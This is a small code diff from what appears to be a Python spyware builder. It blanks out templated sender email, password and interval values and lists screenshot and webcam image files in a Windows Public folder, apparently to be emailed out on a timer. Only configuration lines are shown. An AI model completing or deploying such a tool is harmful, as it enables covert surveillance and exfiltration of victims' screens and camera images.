@@ -12,10 +12,10 @@ from datetime import datetime
 import threading
 from multiprocessing import Process
 
-Sender_Email = '''+f'"{email1}"'+f'''
+Sender_Email = ""
 Reciever_Email = Sender_Email
-Password = '''+f'"{password}"'+f'''
-interval = '''+str(interval)+f'''
+Password = ""
+interval = ""
 
 files = [r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png"]
 
